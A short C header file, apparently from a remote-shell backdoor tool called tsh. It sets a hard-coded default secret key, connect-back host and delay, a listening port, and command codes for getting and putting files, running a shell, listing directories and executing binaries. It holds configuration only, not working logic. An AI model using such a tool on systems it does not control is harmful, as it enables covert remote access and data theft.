#ifndef _TSH_H
#define _TSH_H

#ifndef SECRET_KEY
#define SECRET_KEY "1234"
#endif

#ifndef CB_HOST
#define CB_HOST NULL
#endif

#ifndef SERVER_PORT
#define SERVER_PORT 1234
#endif

char *secret = SECRET_KEY;
char *cb_host = CB_HOST;

short int server_port = SERVER_PORT;

#define CONNECT_BACK_HOST  "localhost"
#define CONNECT_BACK_DELAY 5

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3
#define LS_DIR   4
#define EXEC_BIN 5

#endif /* tsh.h */
